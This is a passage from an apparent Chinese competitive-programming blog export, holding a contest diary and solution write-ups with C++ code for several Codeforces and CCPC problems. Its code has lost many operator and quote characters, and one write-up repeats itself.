是构造，于是我开始看。H 搞了半天没有啥想法，只会通过两次问出 $\\min$ 和 $\\max$，然后之后就异常的难做了。趁着空机，开始敲 C 的暴力和 checker，然后开始盯着 out.txt 看输出。哎就是这么神奇，看着看着在千万种情况中发现了一组极其优美的解，既可扩展又可以消除一列并仍然保持连通。于是把意思传达给队友，让他来写。赛后回想似乎就是由这个 $3 \\times 3$ 的基矩阵，通过镜像拓展得到。 \\begin{pmatrix} 0 & 0 & 1 \\\\ 2 & 1 & 0 \\\\ 1 & 2 & 2 \\end{pmatrix}造了下数据发现没过 checker，仔细看了一下 $m = 4$ 需要特判，然后借助暴力跑了组合法解，将答案拼起来，3 发在封榜后通过。由于这题写了很久，加上想 H 不断倒闭，导致 3-4 小时没有过题。通过 C 以后又想了会儿 H，感觉实在不会，于是提前下班。最后 5 min 时 H 胡乱提交了一发作为烟雾弹，本来还想 299 min 提交 C 装一下，结果被队友制止了…… 滚榜嘞！算上打星队好像是 rk88，银牌！是我第一块牌牌！也是本赛季的第一块牌牌！这场我们学校一队没来，所以我们成了校牌第一。总的来说前期打得挺顺，后面由于 H 没有对上脑电波导致长时间没有过题，但是 K 我们切得异常快，也顺理成章的落到了 5 题中前部的位置。 【Fun Facts】 开局我说应该挑深气球的题来做，于是看了 J 并把题喂给了 Zlw，结果这题最后是 0 人题，连 CF 皇帝也没通过此题。 我们在比赛，微信群里全程视奸，似乎比我们还紧张。但是很遗憾没有 Au，辜负了群友的期待。 晚上吃食堂发现过期的餐券可以用来买特产，遂凑了 100 元餐券买了各种酥😋。 据说很多电脑和网络都崩掉了，我们还算幸运，至少电脑比较顺利。 下周南京站加油！","categories":["Journal"]},{"title":"题解：CF2143E Make Good","path":"/2025/09/19/CF2143E/","content":"简单构造题，但赛时被 D 卡了…… 首先显然的是，$n$ 为奇数肯定无解，直接特判。 接下来尝试构造出合法序列。一个重要的观察是，如果有两个相邻的相同括号，那么它们可以被同时移动到任意处。 $\\textbf{Proof}$ 以两个相邻的左括号为例，只需要进行如下两次操作即可做一次平移： \\texttt{(()} \\to \\texttt{)))} \\to \\texttt{)((}由于左右括号可以相互变化，因此只需要统计相邻的相同括号总数，设为 $cnt$ 且默认均变为一种类型的括号。先把它们统一移到一侧，则剩下的括号只会有两种情况： $\\texttt{()()} \\cdots \\texttt{()}$ 将 $cnt$ 个括号堆中的 $\\frac{cnt}{2}$ 个进行翻转即可。由于每次要翻转两个括号，所以 $\\frac{cnt}{2}$ 得是偶数，也就是 $4 \\mid cnt$。构造变成 $\\texttt{()()} \\cdots \\texttt{()} \\underbrace{\\texttt{((} \\cdots \\texttt{(}}_{\\frac{cnt}{2} 个} \\underbrace{\\texttt{))} \\cdots \\texttt{)}}_{\\frac{cnt}{2} 个}$。 $\\texttt{)()()} \\cdots \\texttt{()(}$ 此时先要用 $4$ 个括号把它变成 $\\texttt{(()()} \\cdots \\texttt{())}$，然后剩余和 $1$ 情况同理。 代码如下： void solve () int n = read (),cnt = 0,d = 0;scanf (%s,str + 1); if (n 1) puts (-1);return; stack char s; for (int i = 1;i = n;++i) if (!s.empty () s.top () == str[i]) cnt += 2,s.pop (); else s.push (str[i]); vector int ans; while (!s.empty ()) ans.push_back (s.top ()),s.pop (); if (!ans.empty () *(--ans.end ()) == )) if (!cnt) puts (-1);return; else cnt -= 2,ans.push_back ((),ans.push_back ((),++d; reverse (ans.begin (),ans.end ()); if (!ans.empty () *(--ans.end ()) == () if (!cnt) puts (-1);return; else cnt -= 2,ans.push_back ()),ans.push_back ()),--d; if (d || (cnt 3)) puts (-1);return; for (auto v : ans) printf (%c,v); for (int i = 1;i = cnt / 2;++i) printf ((); for (int i = 1;i = cnt / 2;++i) printf ()); puts ();","categories":["Solution"]},{"title":"题解：CF2144E Looking at Towers","path":"/2025/09/16/CF2144E/","content":"E1 容易先处理出 $L(a)$ 和 $R(a)$，设元素个数分别为 $cntL,cntR$。 接下来考虑 DP。设 $dp1_{i,j}$ 表示前 $i$ 个数选了 $L$ 中的前 $j$ 个数的方案；$dp2_{i,j}$ 表示后 $i$ 个数选了 $R$ 中的前 $j$ 个数的方案。两者方程相似，故下面只对 $dp1$ 进行讲解。 考虑转移，对于当前的数 $a_i$，以及 $L$ 的前 $j$ 个数已经被选择，可以分为以下三种情况： $a_i = L_j$ 若 $L_j$ 在之前已经被选择，则 $a_i$ 选不选均可，否则需要强制选，则有转移 $dp_{i,j} = 2dp_{i - 1,j} + dp_{i - 1,j - 1}$。 $a_i L_j$ $a_i$ 的选择不会对 $L^\\prime$ 造成影响，则有转移 $dp_{i,j} = 2dp_{i - 1,j}$。 $a_i L_j$ 不能选择 $a_i$，否则会破坏 $L = L^\\prime$，则有转移 $dp_{i,j} = dp_{i - 1,j}$。 当统计答案时，需要小心重复计算的情况。因此当 $a_i$ 为全局最大值时，强制让 $dp1$ 去选择这个最大值，然后强制 $dp_2$ 不选这个最大值，则对答案的贡献为 $(dp1_{i,cntL} - dp1_{i - 1,cntL}) \\times dp2_{i + 1,cntR - 1}$。 时间复杂度为 $O(n^2)$，代码如下： void solve () int n = read (),mx = 0; vector int a (n + 1),L (n + 1),R (n + 1); vector vector int dp1 (n + 1,vector int (n + 1)),dp2 (n + 2,vector int (n + 2)); for (int i = 1;i = n;++i) a[i] = read (); int cntL = 0,cntR = 0; for (int i = 1;i = n;++i) if (mx a[i]) L[++cntL] = a[i],mx = a[i]; mx = 0; for (int i = n;i;--i) if (mx a[i]) R[++cntR] = a[i],mx = a[i]; dp1[0][0] = dp2[n + 1][0] = 1; for (int i = 1;i = n;++i) for (int j = cntL;~j;--j) if (L[j] == a[i]) dp1[i][j] = (dp1[i - 1][j] * 2 % MOD + dp1[i - 1][j - 1]) % MOD; else if (L[j] a[i]) dp1[i][j] = dp1[i - 1][j] * 2 % MOD; else dp1[i][j] = dp1[i - 1][j]; for (int i = n;i = 1;--i) for (int j = cntR;~j;--j) if (R[j] == a[i]) dp2[i][j] = (dp2[i + 1][j] * 2 % MOD + dp2[i + 1][j - 1]) % MOD; else if (R[j] a[i]) dp2[i][j] = dp2[i + 1][j] * 2 % MOD; else dp2[i][j] = dp2[i + 1][j]; ll ans = 0; for (int i = 1;i = n;++i) if (a[i] != mx) continue; ans = (ans + 1ll * ((dp1[i][cntL] - dp1[i - 1][cntL] + MOD) % MOD) * dp2[i + 1][cntR - 1] % MOD) % MOD; printf (%lld ,ans); E2 容易先处理出 $L(a)$ 和 $R(a)$，设元素个数分别为 $cntL,cntR$。 接下来考虑 DP。设 $dp1_{i,j}$ 表示前 $i$ 个数选了 $L$ 中的前 $j$ 个数的方案；$dp2_{i,j}$ 表示后 $i$ 个数选了 $R$ 中的前 $j$ 个数的方案。两者方程相似，故下面只对 $dp1$ 进行讲解。 考虑转移，对于当前的数 $a_i$，以及 $L$ 的前 $j$ 个数已经被选择，可以分为以下三种情况： $a_i = L_j$ 若 $L_j$ 在之前已经被选择，则 $a_i$ 选不选均可，否则需要强制选，则有转移 $dp_{i,j} = 2dp_{i - 1,j} + dp_{i - 1,j - 1}$。 $a_i L_j$ $a_i$ 的选择不会对 $L^\\prime$ 造成影响，则有转移 $dp_{i,j} = 2dp_{i - 1,j}$。 $a_i L_j$ 不能选择 $a_i$，否则会破坏 $L = L^\\prime$，则有转移 $dp_{i,j} = dp_{i - 1,j}$。 当统计答案时，需要小心重复计算的情况。因此当 $a_i$ 为全局最大值时，强制让 $dp1$ 去选择这个最大值，然后强制 $dp_2$ 不选这个最大值，则对答案的贡献为 $(dp1_{i,cntL} - dp1_{i - 1,cntL}) \\times dp2_{i + 1,cntR - 1}$。 时间复杂度为 $O(n^2)$，代码如下： void solve () int n = read (),mx = 0; vector int a (n + 1),L (n + 1),R (n + 1); vector vector int dp1 (n + 1,vector int (n + 1)),dp2 (n + 2,vector int (n + 2)); for (int i = 1;i = n;++i) a[i] = read (); int cntL = 0,cntR = 0; for (int i = 1;i = n;++i) if (mx a[i]) L[++cntL] = a[i],mx = a[i]; mx = 0; for (int i = n;i;--i) if (mx a[i]) R[++cntR] = a[i],mx = a[i]; dp1[0][0] = dp2[n + 1][0] = 1; for (int i = 1;i = n;++i) for (int j = cntL;~j;--j) if (L[j] == a[i]) dp1[i][j] = (dp1[i - 1][j] * 2 % MOD + dp1[i - 1][j - 1]) % MOD; else if (L[j] a[i]) dp1[i][j] = dp1[i - 1][j] * 2 % MOD; else dp1[i][j] = dp1[i - 1][j]; for (int i = n;i = 1;--i) for (int j = cntR;~j;--j) if (R[j] == a[i]) dp2[i][j] = (dp2[i + 1][j] * 2 % MOD + dp2[i + 1][j - 1]) % MOD; else if (R[j] a[i]) dp2[i][j] = dp2[i + 1][j] * 2 % MOD; else dp2[i][j] = dp2[i + 1][j]; ll ans = 0; for (int i = 1;i = n;++i) if (a[i] != mx) continue; ans = (ans + 1ll * ((dp1[i][cntL] - dp1[i - 1][cntL] + MOD) % MOD) * dp2[i + 1][cntR - 1] % MOD) % MOD; printf (%lld ,ans); E2 首先在 E1 的基础上可以滚动数组优化。其次，再次观察可以发现，每次的转移其实只是可根据与 $a_i$ 的相对大小从而分为三类。 首先用 lower_bound 找到满足 $L_x \\ge a_i$ 这一条件最小的 $x$。若能够取等，则这一单点相当于可以从 $x$ 和 $x - 1$ 两个单点转移而来。对于 $L_x a_i$ 的，相当于进行区间乘 $2$ 的操作；对于 $L_x a_i$ 的，相当于继承原有的值，不做任何处理即可。最后的答案，显然只需要将 $cntL$ 与 $cntR - 1$ 时候的值存下来，单点查询就能满足。 因此需要用能够实现区间乘，单点加，单点查询的数据结构维护，直接上线段树即可。时间复杂度优化为 $O(n \\log n)$。 代码如下： #include bits/stdc++.h#define pii pair int,int#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3e5 + 5;const int MOD = 998244353;inline int read ();int tree[MAX 2],lazy[MAX 2];void pushdown (int cur) if (lazy[cur] == 1) return; tree[cur 1] = 1ll * tree[cur 1] * lazy[cur] % MOD; lazy[cur 1] = 1ll * lazy[cur 1] * lazy[cur] % MOD; tree[cur 1 | 1] = 1ll * tree[cur 1 | 1] * lazy[cur] % MOD; lazy[cur 1 | 1] = 1ll * lazy[cur 1 | 1] * lazy[cur] % MOD; lazy[cur] = 1;void build (int cur,int l,int r) tree[cur] = 0;lazy[cur] = 1; if (l == r) tree[cur] = l == 0;return ; int mid = (l + r) 1; build (cur 1,l,mid);build (cur 1 | 1,mid + 1,r);void modify1 (int cur,int l,int r,int x,int v) if (l == r) tree[cur] = v;lazy[cur] = 1;return; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify1 (cur 1,l,mid,x,v); else modify1 (cur 1 | 1,mid + 1,r,x,v);void modify2 (int cur,int l,int r,int x,int y) if (x = l y = r) tree[cur] = tree[cur] * 2 % MOD;lazy[cur] = lazy[cur] * 2 % MOD;return; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify2 (cur 1,l,mid,x,y); if (y mid) modify2 (cur 1 | 1,mid + 1,r,x,y);int query (int cur,int l,int r,int x) if (l == r) return tree[cur]; int mid = (l + r) 1; pushdown (cur); if (x = mid) return query (cur 1,l,mid,x); else return query (cur 1 | 1,mid + 1,r,x);void solve () int n = read (),mx = 0,cntL = 0,cntR = 0; vector int a (n + 1),L (n + 1),R (n + 1),ansl (n + 1),ansr (n + 2); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) if (mx a[i]) L[++cntL] = a[i],mx = a[i]; mx = 0; for (int i = n;i;--i) if (mx a[i]) R[++cntR] = a[i],mx = a[i]; build (1,0,cntL); L.resize (cntL + 1);R.resize (cntR + 1); for (int i = 1;i = n;++i) int id = lower_bound (L.begin (),L.end (),a[i]) - L.begin (); if (L[id] == a[i]) int dx = query (1,0,cntL,id),dy = query (1,0,cntL,id - 1); modify1 (1,0,cntL,id,(dx * 2 % MOD + dy) % MOD); ++id; if (id = cntL) modify2 (1,0,cntL,id,cntL); ansl[i] = query (1,0,cntL,cntL); build (1,0,cntR); for (int i = n;i = 1;--i) int id = lower_bound (R.begin (),R.end (),a[i]) - R.begin (); if (R[id] == a[i]) int dx = query (1,0,cntR,id),dy = query (1,0,cntR,id - 1); modify1 (1,0,cntR,id,(dx * 2 % MOD + dy) % MOD); ++id; if (id = cntR) modify2 (1,0,cntR,id,cntR); ansr[i] = query (1,0,cntR,cntR - 1); ll ans = 0; ansr[n + 1] = 1; for (int i = 1;i = n;++i) if (a[i] != mx) continue; ans = (ans + 1ll * ((ansl[i] - ansl[i - 1] + MOD) % MOD) * ansr[i + 1] % MOD) % MOD; printf (%lld ,ans);int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2140E Prime Gaming","path":"/2025/09/10/CF2140E/","content":"E1首先 $m = 1$ 的时候只有一种全为 $1$ 的情况，答案为 $1$。 接下来只需考虑 $m = 2$ 的情况。由于 $n \\le 20$，考虑状压。 先钦定从左往右数第 $i$ 堆石头的信息存在长度为 $n$ 二进制从高位往低位数的第 $i$ 位上。由于 $c_i = 1/2$，我们设二进制某一位为 $0/1$ 表示石头的数量为 $1/2$。 设 $dp_{i,S,0/1}$ 表示有 $i$ 堆石子，状态为 $S$ 且当前 Alice 为先手/后手的时候最终的那一堆石头的数量是否能为 $2$。则有转移方程： \\begin{cases} dp_{i,S,0} = \\bigvee_{S' \\in \\mathcal{F}(S)} dp_{i-1,S',1}\\\\ dp_{i,S,1} = \\bigwedge_{S' \\in \\mathcal{F}(S)} dp_{i-1,S',0} \\end{cases}其中 $\\mathcal{F}(S)$ 表示 $S$ 中的某一位去掉以后的状态，这个可以进行预处理。 设 $nxt_{S,i}$ 表示状态为 $S$ 去掉第 $i$ 堆石头时形成的状态。但需要注意，这个状态 $S$ 在二进制下的长度一直是 $n$，因此即使没有该位置的信息，直接置为 $0$ 即可。由于是从高位往低位存储信息的，因此是形如 $\\texttt{xxxxoyy} \\to \\texttt{xxxxyy}$ 的合并。显然可以分为两个部分合并，写成如下式子（注意 $i$ 下标是 0-base 的）： nxt_{s,i} = \\left( \\left\\lfloor \\frac{S}{2^{n-i}} \\right\\rfloor \\cdot 2^{n-i} \\right) + \\left( 2 \\cdot \\left( S \\bmod 2^{n-i-1} \\right) \\right)也就是等价于如下表达式： nxt[S][i] = ((S (n - i)) (n - i)) | ((S ((1 (n - i - 1)) - 1)) 1); 最后的答案为 $2^n + \\sum \\limits_{S = 0}^{2^n - 1} dp_{n,S,0}$。 代码如下： void solve () int n = read (),m = read (),k = read (),ans = 0; vector int fl (n); for (int i = 1;i = k;++i) fl[read () - 1] = 1; if (m == 1) puts (1);return; vector vector int dp (1 n,vector int (2,0)),ndp (1 n,vector int (2,0)),nxt (1 n,vector int (n + 1)); for (int S = 0;S (1 n);++S) for (int i = 0;i n;++i) nxt[S][i] = ((S (n - i)) (n - i)) | ((S ((1 (n - i - 1)) - 1)) 1); dp[0][0] = dp[0][1] = 0;dp[1 (n - 1)][0] = dp[1 (n - 1)][1] = 1; for (int i = 2;i = n;++i) for (int S = 0;S (1 i);++S) ndp[S (n - i)][0] = 0,ndp[S (n - i)][1] = 1; for (int j = 0;j i;++j) if (fl[j]) ndp[S (n - i)][0] |= dp[nxt[S (n - i)][j]][1],ndp[S (n - i)][1] = dp[nxt[S (n - i)][j]][0]; for (int S = 0;S (1 i);++S) dp[S (n - i)][0] = ndp[S (n - i)][0],dp[S (n - i)][1] = ndp[S (n - i)][1]; for (int S = 0;S (1 n);++S) ans += dp[S][0]; printf (%d ,ans + (1 n)); E2 跑了 2859 ms，怎么感觉有点蓟县。 E2在 E1 的基础上，我们考虑一下设计的状态所表示的信息。设 $dp_{i,S,0/1}$ 表示当在 $S$ 的状态下，这些位置的石头数量均不小于 $k$ 时，最后的一堆的石头数是否能不小于 $k$。 答案统计的时候，枚举 $k$ 与 $i$，表示 $n$ 堆石头中有 $i$ 堆的石头数量为 $[k,m]$，$n - i$ 堆的石头数量为 $[1,k - 1]$，则 $\\sum\\limits_{S = 0}^{2^n - 1} [ \\operatorname{pop_count}(S) = i ] \\cdot dp_{n,S,0} \\times (m - k + 1)^i \\times (k - 1)^{n - i}$ 表示答案不小于 $i$ 的合法数量。显然最后一堆石头的数量为 $x$ 时的贡献会被拆成 $1,2,\\cdots,x$ 这 $x$ 个地方的单个 $1$ 的贡献，因此最后的答案为： \\sum \\limits_{i = 0}^n\\sum_{S = 0}^{2^n - 1} [ \\operatorname{pop\\_count}(S) = i ] \\cdot dp_{n,S,0} \\times (m - k + 1)^i \\times (k - 1)^{n - i}完整代码如下： void solve () int n = read (),m = read (),k = read ();ll ans = 0; vector int fl (n); for (int i = 1;i = k;++i) fl[read () - 1] = 1; vector vector int dp (1 n,vector int (2,0)),ndp (1 n,vector int (2,0)),nxt (1 n,vector int (n + 1)); vector int cnt (n + 1,0); for (int S = 0;S (1 n);++S) for (int i = 0;i n;++i) nxt[S][i] = ((S (n - i)) (n - i)) | ((S ((1 (n - i - 1)) - 1)) 1); dp[0][0] = dp[0][1] = 0;dp[1 (n - 1)][0] = dp[1 (n - 1)][1] = 1; cnt[1] = 1; for (int i = 2;i = n;++i) for (int j = 0;j = n;++j) cnt[j] = 0; for (int S = 0;S (1 i);++S) ndp[S (n - i)][0] = 0,ndp[S (n - i)][1] = 1; for (int j = 0;j i;++j) if (fl[j]) ndp[S (n - i)][0] |= dp[nxt[S (n - i)][j]][1],ndp[S (n - i)][1] = dp[nxt[S (n - i)][j]][0]; for (int S = 0;S (1 i);++S) dp[S (n - i)][0] = ndp[S (n - i)][0],dp[S (n - i)][1] = ndp[S (n - i)][1]; int tot = __builtin_popcount (S); cnt[tot] = (cnt[tot] + dp[S (n - i)][0]) % MOD; for (int i = 0;i = n;++i) for (int k = 1;k = m;++k) ans = (ans + qpow (m - k + 1,i) * qpow (k - 1,n - i) % MOD * cnt[i]) % MOD; printf (%lld ,ans);","categories":["Solution"]},{"title":"题解：CF2134E Power Boxes","path":"/2025/09/08/CF2134E/","content":"首先考虑出在什么情况下在位置 $x$ 上进行 $\\texttt{throw x}$ 操作可以确定该位置上的值。设 $f_x$ 表示从 $x$ 开始扔球时会进行的次数。若 $f_{x + 1} = f_{x + 2}$，显然 $f_x = f_{x + 1} + 1$，此时无法确定 $x$ 位置上的值。若 $f_{x + 1} eq f_{x + 2}$，此时可以确定。具体来说，有： ans_x = \\begin{cases} 1 & \\texttt{if}\\ f_{x} = f_{x + 1} + 1\\\\ 2 & \\texttt{if}\\ f_{x} = f_{x + 2} + 1 \\end{cases}剩下考虑形如 $f_{x + 1} = f_{x + 2}$，而 $x$ 位置上值未知的情况。由于 $f_x = f_{x + 1} + 1 f_{x + 1}$，因此 $x - 1$ 位置上的值必定已知。尝试进行 $\\texttt{swap x}$ 操作，形成新的关系必定满足 $f_x = f_{x + 1} + 1 = f_{x + 2} + 1$，此时若 $f_{x - 1} + 1 = f_{x + 1}$，则说明原来 $x$ 位置上的值为 $2$，否则为 $1$。 特别的，考虑 $1$ 位置上未知的情况。尝试 $\\texttt{swap 1}$ 后进行 $\\texttt{throw 2}$ 操作，若 $f_2 = f_3 + 1$，则说明原来 $1$ 位置上的值为 $1$，否则为 $2$。 最后来证明操作数不超过 $\\lceil\\frac{3n}{2}\\rceil$。 证明如上所述，$\\texttt{throw x}$ 在每个位置上操作有且仅有 $1$ 次。若 $f_{x + 1} eq f_{x + 2}$，则不需要进行 $\\texttt{swap x}$ 操作，否则必然有 $f_{x - 1} eq f_x$。因此 $\\texttt{swap x} \\le \\lceil \\frac{n}{2} \\rceil$。命题得证。 写的时候需要注意，在 $\\texttt{swap x}$ 以后需要更新 $f_{x - 1},f_{x}$ 的值，防止出现错误！！！ 代码如下： #include bits/stdc++.h#define pii pair int,int#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int query (string op,int x) coutop xendl;fflush (stdout); if (op == throw) return read (); else return -1;void solve () int n = read (); vector int ans (n + 1),f (n + 3,0),d (n + 1); for (int i = n;i;--i) if (f[i + 1] != f[i + 2]) f[i] = query (throw,i); ans[i] = d[i] = 1 + (f[i] != f[i + 1] + 1); else f[i] = f[i + 1] + 1; for (int i = n;i;--i) if (ans[i]) f[i] = f[i + d[i]] + 1; continue; if (f[i + 1] != f[i + 2]) f[i] = query (throw,i); ans[i] = d[i] = 1 + (f[i] != f[i + 1] + 1); continue; f[i] = f[i + 1] + 1; if (i == 1) int x = query (swap,1); if (f[2] + 1 == query (throw,2)) ans[1] = 1; else ans[1] = 2; else int x = query (swap,i - 1); f[i] = query (throw,i - 1); ans[i] = d[i] = 1 + (f[i] == f[i + 1] + 1); swap (f[i - 1],f[i]);swap (d[i - 1],d[i]); f[i] = f[i + ans[i]] + 1; cout! ; for (int i = 1;i = n;++i) coutans[i] [i == n]; fflush (stdout);int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CCPC 2024 重庆站 有限小数","path":"/2025/08/07/CCPC CQ24 Finite Decimal/","content":"有限小数 终于把上个赛季重庆站的题目给补了。(以下证明部分参考 CCPC2024 重庆_补题记录ADFGH) 命题 若 $b = w2^x5^y$，则最优条件下 $d$ 一定可以表示为 $w2^{x\\prime}5^{y\\prime}$(其中 $w,z$ 不再含有 $2,5$ 的幂次)。 证明 设 $d = z2^{x\\prime}5^{y\\prime}$，则 $\\frac{a}{b} + \\frac{c}{d} = \\frac{az2^{x\\prime}5^{y\\prime} + wc2^x5^y}{wz2^{x + x\\prime}5^{y + y\\prime}}$。接下来处理分子，由于最后是有限小数，一定存在 $k$ 使得 $az2^{x\\prime}5^{y\\prime} + wc2^x5^y = kwz$ 成立。 把 $c,k$ 看作未知数，写成 exgcd 的标准形式： (-w2^x5^y) \\times c + wz \\times k = az2^{x\\prime}5^{y\\prime}有解当且仅当 $\\gcd(-w2^x5^y,wz) = w \\mid az2^{x\\prime}5^{y\\prime}$，也就是 $w \\mid az$。由于 $\\gcd (a,b) = 1$，则 $\\gcd (a,w) = 1$，因此得到 $w \\mid z$。 同理，把 $a,k$ 当作未知数，可以得到 $z \\mid w$。 综上，$z = w$ 成立。 因此，$\\frac{a}{b} + \\frac{c}{d} = \\frac{a2^{x\\prime}5^{y\\prime} + c2^x5^y}{w2^{x + x\\prime}5^{y + y\\prime}}$。由于最后是有限小数，所以可以进一步把和表示为 $\\frac{kw}{w2^{x + x\\prime}5^{y + y\\prime}} = \\frac{kw^2}{bd}$。枚举 $d$ 中的 $x^{\\prime},y^{\\prime}$，然后求不定方程 b \\times c - w^2 \\times k = -ad直接 exgcd 后求出 $c$ 的最小值即可。","categories":["Journal"]},{"title":"题解：CF1453D Checkpoints","path":"/2025/08/06/CF1453D/","content":"提供一种直接基于期望推表达式的做法。 设 $p$ 表示走一步成功的概率，$E[x]$ 表示从一个存档点开始，还剩 $x$ 步的距离到达下一个存档点，所需的期望步数。若一次成功，共走 $x$ 步，概率为 $p^x$；若走到第 $i$ 步时失败，概率为 $p^{i-1}(1-p)$，之后需要重新开始，共走 $E[x]$ 步。因此有表达式： E[x] = x \\times p^x + \\sum \\limits_{i = 1}^x p^{i - 1}(1-p)(i + E[x])直接将 $p = \\frac{1}{2}$ 带入可知： E[x] = x (\\frac{1}{2})^x + 2[1 - (x + 2)(\\frac{1}{2})^{x + 1}] + [1 - (\\frac{1}{2})^x]E[x]\\\\ \\\\ (\\frac{1}{2})^xE[x] = 2 - (\\frac{1}{2})^{x - 1}\\\\ E[x] = 2^{x + 1} - 2因此直接构造 $\\texttt{100…}$ 的形式，类似二进制拆分进行构造即可。由于 $E[x]$ 为偶数，所以奇数的情况显然无解。 代码如下： #include bits/stdc++.h#define pii pair int,int#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline ll read ();void solve () ll x = read (); if (x 1) puts (-1);return; vector ll f (61,0); for (int i = 0;i = 60;++i) f[i] = (1ll (i + 2)) - 2; vector int ans; for (int i = 60;~i;--i) while (x = f[i]) x -= f[i]; ans.push_back (1); for (int j = 1;j = i;++j) ans.push_back (0); assert ((int)ans.size () = 5000); printf (%d ,(int) ans.size ()); for (auto v : ans) printf (%d ,v); puts ();int main () int t = read (); while (t--) solve (); return 0;inline ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2129C Interactive RBS","path":"/2025/08/04/CF2129C/","content":"非常好玩的一道题！ Easy Version 首先不难想到首先要找到一对括号，然后再次基础上询问其它的。简单拆分一下询问次数，$550 = 2 \\times 20 + 500 + \\text{eps}$，发现在找到括号后需要询问一次处理两个括号。至于为什么是 $2 \\times 20$，原因便是在 $[l,r]$ 中即使有左右括号，它可能以 $\\texttt{()}$ 或 $\\texttt{)(}$ 的形式出现，因此需要正反各询问一次。 接下来考虑如何一次询问处理两个括号。其实方法很多，适合手玩，用上 substring 这个条件，尽量构造不对称括号序列即可。我构造的是 $\\texttt{()??()}$，有以下几种情况： ans = \\begin{cases} 1\\ \\ \\ \\ \\texttt{((((()} \\\\ 2\\ \\ \\ \\ \\texttt{(()(()} \\\\ 3\\ \\ \\ \\ \\texttt{((()()} \\\\ 4\\ \\ \\ \\ \\texttt{(())()} \\\\ \\end{cases}设 $L,R$ 为二分找到的左/右括号位置，以第一个为例子，查询的写法为 query ({L,L,x,y,L,R}。注意，如果剩下未确定的数量是奇数，需要特殊考虑。 Medium Version 询问次数变为 $200$ 以内，需要一次至少测 $6$ 个。 如果接着从上一节的询问出发，直接赋值询问序列，会发现情况并不会显著增长，原因就是受到相互影响。所以进一步思考如何才能独立考虑。 尝试构造 $\\texttt{(?((?((?(…}$ 的序列。具体来说，用二进制数的思想，第 $i$ 个待检测位置出现 $2^{i - 1}$ 次，即 $\\texttt{(x((y((y((z((z((z((z(…}$。得到答案后，从低往高第 $i$ 位为 $1$，则说明第 $i$ 个待检测的位置为 $\\texttt{)}$，否则为 $\\texttt{(}$。当然，若剩余待检测位置的数量不足，直接用 $L$ 补齐即可，处理的时候特判。 最后检验一下合法性。若一次检测 $x$ 个，询问的长度为 $3(2^0 + 2^1 + \\cdots + 2^{x - 1}) = 3(2^x - 1)$。由于长度不能超过 $1000$，因此 $x_{\\max} = 8$，可以通过此题。 Hard Version 询问次数变为 $100$ 以内，需要一次至少测 $13$ 个。 接着上一节的想法，尝试构造互不影响的序列。尝试构造序列 $\\texttt{(x((y(y((…}$，组内用 $\\texttt{(}$ 分隔，组间用 $\\texttt{((}$ 分隔。设第 $i$ 个待检测的位置出现 $dig_i$ 次，则对答案的贡献为 $sum_i = \\frac{(dig_i + 1)dig_i}{2}$。进一步来说，只要满足下式条件即可： exists i \\in I \\quad \\text{s.t.} \\quad sum_i = \\sum_{j \\in J} sum_j其中 $I = \\{1,2,\\cdots,|sum|\\}$，$J \\subseteq I \\setminus \\{i\\}$，且满足 $\\forall j,k \\in J, j eq k$。 容易发现，当 $2sum_{i - 1} \\le sum_i$ 时可以满足条件，通过暴力打表发现，最大的符合题目限制的 $dig$ 集合为 $\\{1,2,4,6,9,13,19,28,40,57,81,115\\}$。但是此时 $|dig| = 12$，按照原来的二分方式会超过限制。仔细思考可以发现原来的二分每一次的 check 需要花费 $2$ 次询问，但是我们只想要知道序列中是否存在左右括号以及括号的方向。因此，当方向未确定时，我们将询问的序列正反拼接，得到有无左右括号的信息。一旦在某次询问中得知存在左右括号，直接花费额外的一次询问定方向。在得知方向后，每次二分只需要一次询问去缩小范围。二分的询问次数的上确界为 $\\lceil{\\log (10^3)} + 1 \\rceil = 11$ 次，总询问次数的上确界为 $11 + \\lceil \\frac{10^3}{12} \\rceil = 11 + 84 = 95$ 次，同时单次询问长度不会超过 $1000$，已经可以通过此题。 但能否进一步优化呢？按照之前的互不影响的条件去构造基，可以尝试写一个 $O(k^2 2^k)$ 的状压构造并手动调整，在此不过多赘述，直接给出一组长度为 $13$ 的可行构造：$\\{1,2,4,5,8,11,16,23,33,57,74,105,150\\}$，可以证明不存在比 $13$ 更大且满足条件限制的基。此时总询问次数的上确界可以降为 $11 + \\lceil \\frac{10^3}{13} \\rceil = 11 + 77 = 88$ 次，理论上应该已经达到最优解了。 完整代码如下： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;const int UP = 13;inline int read ();int dig[] = 1,2,4,5,8,11,16,23,33,57,74,105,150;int query (vector int lst) printf (? %d ,(int)lst.size ()); for (auto v : lst) printf (%d ,v); puts ();fflush (stdout); return read ();void solve () int n = read (); int l = 1,r = n,L = -1,R = -1,sure = -1; vector char ans (n + 1); auto check = [] (int l,int r) - bool vector int lst; for (int i = l;i = r;++i) lst.push_back (i); if (sure == 0) return query (lst); else if (sure == 1) reverse (lst.begin (),lst.end ()); return query (lst); for (int i = r;i = l;--i) lst.push_back (i); if (!query (lst)) return false; 